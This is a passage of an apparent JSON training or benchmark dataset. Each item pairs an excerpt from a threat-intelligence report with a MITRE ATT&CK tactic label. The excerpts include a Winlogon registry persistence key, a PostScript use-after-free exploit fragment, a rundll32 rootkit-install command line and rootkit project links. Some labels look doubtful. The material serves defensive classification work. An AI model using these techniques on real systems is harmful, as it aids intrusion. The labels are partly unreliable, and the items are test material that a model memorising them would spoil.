        "input": "Described attack activity: The loader sends binary data through the named pipe to the orchestrator. This blob contains: \n\u2022 a command ID (2): CMC_TAKE_LOADER_BODY   \n\u2022 the loader path file   \n\u2022 the loader PE \nOnce this message is received by the orchestrator, the loader is securely deleted by overwriting the file content and deleted through the DeleteFile function. \nAfterwards, the persistency is set up. The persistency information is retrieved from the resource \"105\" and stored in the Gazer storage. Among these data, there is a dword value that is used to choose which persistency mode will be applied. \nThe resource 105 is structured in the following way: \n\u2022 a dword value representing the persistence mode \u2022 a dword value representing the size of the data \u2022 the persistence information \nThere are 6 different persistence modes. \n0: ShellAutorun \nPersistence is achieved through the Windows registry by setting the value \"Shell\" with \"explorer. exe, %malware_pathfile%\" under the following key: \nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, the threat actor initiated all actions over RDP and executed their actions via that GUI access. From this access, they also used some PowerShell and Cmd sessions to execute various scripts used during the intrusion. We observed execution of several scripts detailed in theexfiltration section, and highlight others throughout the rest of the report that the threat actor dropped in the network but were not utilized.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot made extensive use of process injection to hide in benign operating system processes. It first injected into wermgr.exe and then later into svchost.exe.\nAnother defense evasion technique employed by Cobalt Strike, was to disable Windows Defender. WMIC was used to remotely execute 'def.bat'. The contents of 'def.bat':",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases. In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers. In many other cases, threat actors downloaded sensitive data via Cobalt Strike Beacons.\nOne notable case for the year was theDiavol Ransomware. Ransomware operators usedufile.ioto upload the LSASS dump file they extracted from one of the domain controllers.\nTo wrap up this chapter, we'd like to provide an overview of the tools that we've seen attackers employ this year. We included the tools in their respective phases of attack after seeing them in action. We used the MITRE ATT&CK framework to show how these tools work at various phases of an attack.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot maintained persistence by creating scheduled tasks across multiple endpoints. An example of a command that was executed can be seen below:\nThe scheduled task creation events were recorded in theMicrosoft-Windows-TaskScheduler/Operationallog.\nInspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value. This value differed from endpoint to endpoint:\nThe data of this registry key consisted of a base64-encoded string:\nDecoding the base64-encoded string revealed a significant number of QBot's C2 IPv4 addresses and ports:\nC2 IPv4s are provided in the IoC section of this report.\nThe SysWow64\\Explorer.exe process was also observed cycling through a number of domains  indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR).\nIn addition, several connectivity checks were made to email relay services:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While GeoServer's open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function \"JXPathUtils.newSafeContext\" instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures-such as regularly updating software, employing threat detection tools, and enforcing strict access controls-can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We believe this intrusion would have ended with domain wide ransomware. The deployment of the Get-DataInfo.ps1 script and overall TTP's used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.\nEnjoy our report? Please consider donating $1 or more usingPatreon. Thank you for your support!\nWe also have pcaps, memory captures, scripts, executables, and Kape packages availablehere",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Execution of the initial Bazar Loader malware relies on user interaction.\nExecutables transferred over SMB during lateral movement were commonly executed via a service.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In April, a group known as the \"Shadow Brokers\" released a cache of stolen information that included multiple tools to exploit vulnerabilities in various versions of Microsoft Windows. The most famous of these is an exploit tool called \"EternalBlue\" which was repurposed to spread the WanaCrypt0r ransomware/worm earlier this month. Another tool released in this dump is \"EsteemAudit\", which exploits CVE-2017-9073, a vulnerability in the Windows Remote Desktop system on Windows XP and Windows Server 2003. Both versions of this operating system are no longer supported by Microsoft (XP ended in 2014, Server 2003 in 2015) and as such Microsoft has not released a patch for the vulnerability.\nOrganizations that still rely on these out-of-date operating systems need to ensure they are defending against exploitation of this vulnerability, as it allows a remote attacker to take control over the system without any authentication.\nPalo Alto Networks defends our customers' systems from this exploit in the following ways:\nTrapsprevents exploitation of this vulnerability on Windows XP and Server 2003 hosts. \nThreat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.\nOrganizations that cannot upgrade systems and do not use the protections describe above should considerdisabling the smart card modulethrough Group Policy or in the registry.\nExploitation of the vulnerability is complex, but the EsteemAudit tool makes it possible for novices to use it. The remainder of this blog includes a detailed analysis of where the vulnerability exists and how EsteemAudit exploits it.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cisco Talos recently discovered a new campaign targeting Lebanon and the United Arab Emirates (UAE) affecting .gov domains, as well as a private Lebanese airline company. Based on our research, it's clear that this adversary spent time understanding the victims' network infrastructure in order to remain under the radar and act as inconspicuous as possible during their attacks. \nBased on this actor's infrastructure and TTPs, we haven't been able to connect them with any other campaign or actor that's been observed recently. This particular campaign utilizes two fake, malicious websites containing job postings that are used to compromise targets via malicious Microsoft Office documents with embedded macros. The malware utilized by this actor, which we are calling \"DNSpionage,\" supports HTTP and DNS communication with the attackers. \nIn a separate campaign, the attackers used the same IP to redirect the DNS of legitimate .gov and private company domains. During each DNS compromise, the actor carefully generated Let's Encrypt certificates for the redirected domains. These certificates provide X.509 certificates for TLS free of charge to the user. We don't know at this time if the DNS redirections were successful. \nIn this post, we will break down the attackers' methods and show how they used malicious documents to attempt to trick users into opening malicious websites that are disguised as \"help wanted\" sites for job seekers. Additionally, we will describe the malicious DNS redirection and the timeline of the events. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The ransomware was executed on multiple servers using a batch scriptstart.bat:\nHere is the first ransomware execution which was observed on the Domain Controller:\nBelow is another example of the ransomware execution on one of the external servers:\nOnce the encryption process was complete a file called RecoveryManual.html was left across the filesystem with the instructions on how to contact the threat actors for the ransom negotiations.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: $\\%$ Create dict2 and fill it with   \n$\\%$ several key-value pairs   \n/dict2 5 dict def   \ndict2 begin   \n/k1 1000 array def   \n/k2 1000 array def   \ndict2 end   \n$\\%$ Create dict1 and fill it with   \n$\\%$ one key-value pair under k1   \n/dict1 3 dict def   \ndict1 begin   \n/k1 1000 array def   \ndict1 end \nThe EPS Awakens | Mandiant | Google Cloud Blog $\\%$ Begin forall enumeration on dict2 dict2 { $\\%$ Destroy dict2's internal hash-table, $\\%$ freeing all key-value pairs dict1 dict2 copy $\\%$ Create a new string to overwrite the $\\%$ freed key-value pair k2. $\\%$ The string contains a forged key-value pair 44 string 0 <00000000ff03000000050000000000000000 00002000e013030000000000000000000000 44444444> putinterval $\\%$ Next iteration of the loop uses stale. $\\%$ ptrNext, which points into the above string, $\\%$ and reads a forged key-pair } forall \nPosted in Threat Intelligence-Security & Identity ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Transparent Tribe has been a highly active APT group in the Indian subcontinent. Their primary targets have been government and military personnel in Afghanistan and India. This campaign furthers this targeting and their central goal of establishing long term access for espionage. The use of multiple types of delivery vehicles and file formats indicates that the group is aggressively trying to infect their targets with their implants such as CrimsonRAT. They have continued the use of fake domains masquerading as government and quasi-government entities, as well as the use of generically themed content-hosting domains to host malware. Although not very sophisticated, this is an extremely motivated and persistent adversary that constantly evolves tactics to infect their targets. \nOrganizations should remain vigilant against such threats, as they are likely to proliferate in the future. In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises and reviewed and improved every time it's put to the test on real engagements. \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nSnort SIDs: 59222-59223 \nThe following ClamAV signatures available for protection against this threat: \nVbs.Downloader.Agent-9940743-0   \nWin.Downloader.TransparentTribe-9940744-0   \nWin.Trojan.MargulasRAT-9940745-0   \nWin.Downloader.Agent-9940746-0   \nWin.Trojan.MSILAgent-9940762-1   \nWin.Trojan.PythonAgent-9940791-0   \nLnk.Trojan.Agent-9940793-0   \nWin.Trojan.TransparentTribe-9940795-0   \nWin.Trojan.TransparentTribe-9940801-0   \nWin.Downloader.TransparentTribe-9940802-0 ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1030: Data Transfer Size Limits T1567: Exfiltration Over Web Service T1567.001: Exfiltration to Code Repository \nPosted in Threat Intelligence-Security & Identity ",
        "output": "exfiltration",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As modern ransomware attacks became one of the most dangerous cybersecurity incidents that can happen to organizations in recent years, we explored its current state and the possible directions that ransomware groups can take it. Noting that there are other cybercriminal business models where more illicit money can be made, and the changing geopolitical and economic conditions affecting this illegal enterprise, we looked at the possible triggers that can lead to gradual alterations in how we have observed ransomware business models are designed and operated.\nThis blog post discusses some of the possible triggers, detailed in \"The Near and Far Future of Ransomware Business Models,\" that can push Ransomware-as-a-Service (RaaS) groups to make small changes in their current operations (in the section we call \"Evolutions\"). Looking further ahead and considering the aggregation of these triggers and small changes, we look at the potentially larger modifications these groups can make to further other possible objectives in the long run (in the section \"Revolutions\"). While we identify five key points for impact in our research, this entry focuses on three points for discussion:\nWhen compelled, ransomware actors will adapt and adopt other criminal business models - online or offline - that monetize initial access, such as short and distort scheme or other forms of stock fraud, business email compromise (BEC), and cryptocurrency theft, among others. \nRansomware actors are expected to evolve and deploy routines with more automation, better operational security (OpSec), and adding new cloud targets and internet of things (IoT) platforms. Linux ransomware will likewise continue to grow. \nCryptocurrency crime is expected to grow significantly, and ransomware actors are expected to be involved in crypto crime sooner or later.\nKey Underground Services That Enable Ransomware\nOver the years, ransomware evolved to become a fusion of previously deployed threats that extorted the public. From this angle, we see that ransomware groups and their business models have never remained static and have considered themselves as profitable business ventures that need to constantly adjust with the changing technology and environment. This begs the question, where can ransomware go next?\nTo answer this question, we should consider the building blocks of today's ransomware models, varied and customized at each block and turn by ransomware groups to suit their needs in relation to their targets' environments. Each block can be seen as separate entities contributing to a whole ecosystem functioning:\nInitial access: Attackers find an entry vector into the targeted victim's network. Launching an email campaign with backdoor payloads, sending specifically crafted social engineering campaigns aimed at enterprises, exploiting vulnerabilities, and buying credentials from the underground are just some examples of ways to gain access to systems. \nLateral movement and privilege escalation: Attackers navigate deeper and around the victim's network with standard or customized hacking tools. \nSensitive data exfiltration: Attackers find sensitive information in the machines and steal it. Sifting through the data can also occur while navigating the victim machines or after exfiltration, allowing the threat actors to determine the ransom amount or if the victim has cyber insurance. \nBackup systems' disruption: Attackers disrupt and damage backup systems and processes in order to lower the victim's chances of restoring machines and recovering data on their own. \nRansomware payload deployment: Attackers encrypt files and IT systems, disrupting operations. \nExtortion methods: Attackers demand payment in exchange for the decryption keys to recover files and restore systems. Additional extortion methods are imposed on the victims if they choose not to pay the ransom. \nMoney laundering: Attackers launder their money via cryptocurrency to mask the real identities of the ransom beneficiaries. These are often done via cryptocurrency exchanges, mixers, or combinations of other tricky means.\nTriggers for change\nMuch like legitimate enterprises, ransomware groups see their deployment and attacks as businesses delve into business development. This coincides with internal and external changes that significantly mark and affect their operations. This section provides two examples of triggers that affect the key points for discussion. For the full list of triggers, download our researchhere.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BRONZE BUTLER uses credential theft tools such as Mimikatz and WCE to steal authentication information from the memory of compromised hosts. Several xxmm samples analyzed by CTU researchers incorporate Mimikatz, allowing the threat actors to issue Mimikatz commands directly from xxmm (see Figure 10). In addition, xxmm incorporates a UAC bypass tool for privilege escalation prior to stealing passwords. \nnd Ticket Granting Service (TGS) ure 11 shows an example of the threat \nGolden tickets require a username, but the domain controller does not validate that it is legitimate. CTU researchers detected BRONZE BUTLER using the following usernames for golden tickets: \nbgtras bgtrs kkir kisetr netkin orumls wert ",
        "output": "credential access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1005: Data from Local System   \nT1039: Data from Network Shared Drive   \nT1056.001: Keylogging   \nT1074: Data Staged   \nT1213.002: Sharepoint   \nT1560: Archive Collected Data   \nT1560.001: Archive via Utility ",
        "output": "collection",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Matt Olney \nTUESDAY, APRIL 18, 2023 11:02 \nTHREATS SECUREX THREAT ADVISORY \nCisco is deeply concerned by an increase in the rate of high-sophistication attacks on network infrastructure - that we have observed and have seen corroborated by numerous reports issued by various intelligence organizations - indicating state-sponsored actors are targeting routers and firewalls globally. We have spoken about infrastructure security for a long time. However, \nwhile working with network infrastructure in various parts of the world, we have observed both espionage and obvious targeting to support future destructive attacks. While working with our partners, we have experienced the operational barriers that slow and sometimes stop security teams from properly securing network infrastructure. In this report, we are sharing both our observations of top-tier attackers and their activities on network devices, and recommendations and resources to help you improve your network infrastructure resilience. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1218.007 System Binary Proxy Execution: Msiexec \nDiscovery \nT1069.002 Permission Groups Discovery: Domain Groups   \nT1016 System Network Configuration Discovery   \nT1482 Domain Trust Discovery   \nT1018 Remote System Discovery   \nT1057 Process Discovery   \nT1007 System Service Discovery   \nT1518.001 Software Discovery: Security Software Discovery   \nT1124 System Time Discovery   \nT1082 System Information Discovery   \nT1033 System Owner / User Discovery ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Earth Estries uses PSExec to laterally install its backdoors and tools, notably by copying theCABfiles containing the backdoors or tools, and a batch file to perform the installation, maintain persistence, and execute the tools.\nTypically, PSExec is used to copy the CAB file containing the malware that will be laterally installed. However,in some instances, WMIC may be used in its place to achieve similar results. A set of batch files will then be copied and executed to perform the extraction, installation, and execution of the malware. Large scale collection may also be executed using batch files.\nIn later stages of the attack, the backdoors may be used directly to perform lateral movement. CAB files are still used as containers for the tools to be installed, and batch files are still incorporated in the extraction, installation and execution of said tools. This will sometimes include the creation of persistence mechanisms for the batch file to act as an indirect persistence mechanism for the actual backdoors.",
        "output": "lateral movement",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the persistence stage, the actors deployed different loaders to maintain their foothold, including DUNLOADER, TESDAT and DMLOADER. These loaders are used to load payload files into memory and execute them. These loaders are then used to deploy more malware and exfiltrate data over public cloud services like Dropbox and OneDrive. In some cases, rootkits, including KRNRAT and MORIYA, were implanted by the loaders to bypass the scanning.\nLoaders\nBetween 2022 and 2024, we observed multiple loaders implanted in victim environments, including DUNLOADER, TESDAT and DMLOADER. Most of the final payloads are Cobalt Strike beacons.\nThe first loader we encountered is DUNLOADER. It's capable of loading the payloads from either of the locations and decode it in one-byte XOR operations:\nFrom a file named \"pdata.txt\" \nFrom its own resource blob named \"BIN\"\nThis loader is a DLL file and always ensures that it's executed by \"rundll32.exe\" by checking if the name of the parent process contains a specific string literal \"und\". In most cases, this DLL should contain an export function called \"Start.\"\nThe newer loader we later found is called TESDAT. It always loads a payload file with a \".dat\" extension (like \"mns.dat\"). Instead of using common APIs like CreateThread to execute the decoded shellcode, it always calls an API called \"SwitchToFiber,\" which we think is an attempt to avoid detection. Our analysis showed two variants for TESDAT loaders. It can be either an EXE file or a DLL file with an export function called \"Init.\"\nWe also noticed that the actors would name the loaders with some random strings and put them inside the folders that were often accessed by the victims instead of those commonly used by attackers (i.e., %ProgramData% or %Public%). This was presumably intended to blend the loaders with legitimate user files. Here are some filename examples:\nC:\\Users\\{user}\\downloads\\wcrpc.dll \nC:\\Users\\{user}\\downloads\\mflpro\\acrg.dll \nC:\\Users\\{user}\\documents\\ViberDownloads\\mfsvc.dll \nC:\\Users\\{user}\\downloads\\fwdjustification\\dilx.exe \nC:\\Users\\{user}\\downloads\\ffap3560pcl6220510w636iml\\drasc.dll \nC:\\Users\\{user}\\downloads\\1\\2\\3\\prikc.exe \nC:\\Users\\{user}\\Downloads\\Rufus\\gpupdat.exe\nMore recently, we observed a new loader, DMLOADER, was implanted. Instead of loading an additional payload file, it loads the embedded payload and decodes it as an in-memory PE buffer. This loader usually has an export function called \"DoMain\" or \"StartProtect.\" In the decoded PE payload, it should have an export function called \"MThread.\"\nRootkits\nAfter the loaders are implanted in the victim machines, we found rootkits installed on some compromised machines. To install the rootkits, the threat actor abused a living-off-the-land binary called \"syssetup.dll\" and dropped an INF file to install them. An example of the used command line is as follows:\nC:\\Windows\\SysWOW64\\rundll32.exe syssetup,SetupInfObjectInstallAction DefaultInstall 128 c:\\users\\{user}\\downloads\\SmartFilter.inf\nThe first rootkit we observed is called MORIYA, which could hide the malicious payload in the TCP traffic.\nMORIYA works as a TCP traffic interceptor. It tries to monitor if an incoming TCP packet is from the command-and-control (C&C) server by checking its first six magic bytes. The magic bytes could be registered by issuing a specific IOCTL code 0x222004 from its user-mode agent. If any packet is matched, it tries to inject the malicious payload into the body of the response packet. The variant we found works exactly the same as the one from this MORIYAreport.\nThe MORIYA variant we found has an additional shellcode injection capability. At the end of its execution, it tries to load a payload file from the location \"\\\\SystemRoot\\\\system32\\\\drivers\\\\{driver_name}.dat.\" The payload will be decrypted in AES and injected into the process of svchost.exe. This payload should be its user-mode agent.\nThe shellcode will eventually be invoked by using the API NtCreateThreadEx. To bypass detection, it tries to invoke the call by directly using the syscall number. To get the valid syscall numbers on the targeted system, it enumerates the NTDLL's export functions, finds the ones with names starting with \"Zw\" or \"Nt\" and saves the syscall number of each. This code snippet is reused fromthis post.\nThe other rootkit we found is called KRNRAT. It's a full-featured backdoor with various capabilities, including process manipulation, file hiding, shellcode execution, traffic concealment, and C&C communication. We named this rootkit KRNRAT because of its internal name, just as written in its PDB string: N:\\project\\li\\ThreeTools\\KrnRat\\code\\x64\\Debug\\SmartFilter.pdb\nOur analysis showed that KRNRAT is based upon multiple open-source projects:\nhttps://github.com/w1nds/ishellcode \nhttps://github.com/DarthTon/Blackbone \nhttps://github.com/XaFF-XaFF/Cronos-Rootkit \nhttps://github.com/JKornev/hidden \nhttps://github.com/amitschendel/venom-rootkit\nKRNRAT supports numerous IOCTL codes and capabilities. Its debug strings are also self-explanatory. Here's the full table of the supported IOCTL codes.\nTable 2. The command codes supported in KRNRAT\nAt the end of its execution, it also loads the additional payload file and injects it into the svchost.exe process. This shellcode injection capability works exactly the same as the MORIYA variant we found. This time, we were able to collect the payload, which turns out to be the user-mode agent for KRNRAT and is the backdoor. This means that its user-mode agent is always memory-resident.\nThe backdoor is a stager. It connects to the C&C server and downloads the next-stage payload back. It tries to hide the process and connections by issuing the specific IOCTL codes to the KRNRAT rootkit.\nTable 3. The structure of the backdoor's configuration in the registry\nThe final payload from the C&C server would be the so-calledSManager.",
        "output": "persistence",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 5 to evade detection. \nTable 5: Defensive evasion techniques ",
        "output": "defense evasion",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Risky user created global admin \nThis detection will alert users based on the risk score proved by Azure AD Identity Protection when a new global admin was created by a user that had a risky sign-in. An attacker might have compromised the user account to perform lateral movement. \nInvestigate the new global admin account to determine if it was created legitimately and if the user account that performed the action was compromised. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: AnonymousFox|Asuiteofautomated hacking tools toexploit insecure adminpanelsorvulnerableplatforms andwebsites ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors behind the Sea Turtle campaign gained initial access either by exploiting known vulnerabilities or by sending spear-phishing emails. Talos believes that the threat actors have exploited multiple known CVEs to either gain initial access or to move laterally within an affected organization. Based on our research, we know the actor utilizes the following known exploits: \nCVE-2009-1151: PHP code injection vulnerability affecting phpMyAdmin   \nCVE-2014-6271: RCE affecting GNU bash system, specifically the SMTP (this was part of the Shellshock CVEs) CVE-2017-3881: RCE by unauthenticated user with elevated privileges Cisco switches   \nCVE-2017-6736: Remote Code Exploit (RCE) for Cisco integrated Service Router 2811   \nCVE-2017-12617: RCE affecting Apache web servers running Tomcat CVE-2018-0296: Directory traversal allowing unauthorized access to Cisco Adaptive Security Appliances (ASAs) and firewalls CVE-2018-7600: RCE for Website built with Drupal, aka \"Drupalgeddon\" \nAs of early 2019, the only evidence of the spear-phishing threat vector came from a compromised organization's public disclosure. On January 4, Packet Clearing House, which is not an Internet exchange point but rather is an NGO which provides support to Internet exchange points and the core of the domain name system, provided confirmation of this aspect of the actors' tactics when it publicly revealed its internal DNS had been briefly hijacked as a consequence of the compromise at its domain registrar. \nAs with any initial access involving a sophisticated actor, we believe this list of CVEs to be incomplete. The actor in question can leverage known vulnerabilities as they encounter a new threat surface. This list only represents the observed behavior of the actor, not their complete capabilities. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the race to gain a competitive edge, organizations are increasingly training artificial intelligence (AI) models on sensitive data. But what if a seemingly harmless AI model became a gateway for attackers?\nA malicious actor could upload a poisoned model to a public repository, and without realizing it, your team could deploy it in your environment. Once active, that model could exfiltrate your sensitive machine learning (ML) models and fine-tuned large language model (LLM) adapters. With access to these adapters, attackers could replicate your custom tuning and optimizations, exposing sensitive information embedded in fine-tuning patterns.\nPalo Alto Networks researchers recently uncovered two vulnerabilities in Google's Vertex AI platform. These vulnerabilities could have allowed attackers to escalate privileges and exfiltrate models.\nWe have shared these findings with our partners at Google, and they have since implemented fixes to eliminate these specific issues for Vertex AI on the Google Cloud Platform (GCP). Read on to understand how these vulnerabilities worked and how you can protect your environment from similar threats.\nIn this article, we outline our steps to discover two vulnerabilities in the Vertex AI platform:\nPrivilege escalation via custom jobsBy exploiting custom job permissions, we were able to escalate our privileges and gain unauthorized access to all data services in the project. \nModel exfiltration via malicious modelDeploying a poisoned model in Vertex AI led to the exfiltration of all other fine-tuned models, posing a serious proprietary and sensitive data exfiltration attack risk.\nOur examination of the first vulnerability ended with a classic privilege escalation, but the second vulnerability represents a much more interesting \"model-to-model\" infection scenario that required an in-depth exploration.\nFigure 1 shows a diagram demonstrating the two vulnerabilities.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourPrisma Cloudofferings.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The BlueSky ransomware binary namedvmware.exewas dropped on the beachhead, which upon execution, resulted in network wide ransomware. This was accomplished using SMB with the ransomware connecting to host over port 445 to encrypt files.\nThe files were renamed with the file extension .bluesky and a ransom note file named # DECRYPT FILES BLUESKY #.txt was dropped on the host and opened to reveal the ransom note.\nOn the beachhead server, the time of encryption was visible as the MSSQL service stopped functioning after execution ofvmware.exe:\nThe whole intrusion after initial access lasted only around 30 minutes with limited discovery and no exfiltration observed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Throughout the intrusion, multiple Command & Control channels were established. Some channels relied on legitimate RMM services (ScreenConnect, Atera & Splashtop) while other tooling is specifically adversary (Cobalt Strike, Metasploit). The following timeseries (logarithmic scale) outlines the traffic generated by the different tooling, highlighting their deployment & usage order.\nMost interesting is how, solely from a network perspective, a drastic anomalous increase in activity can be observed hours/minutes prior to the exfiltration and impact stages. This rupture in C2 patterns without new infections offers incident responders potential telltale signs of an imminent change of adversary intent.\nTo provide a perspective on the above logarithmic scale, the approximate one hour and 30 minutes of Rclone exfiltration accounted for more than 90% of the attacker-generated network traffic.\nMetasploit\nScreenConnect",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol. ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
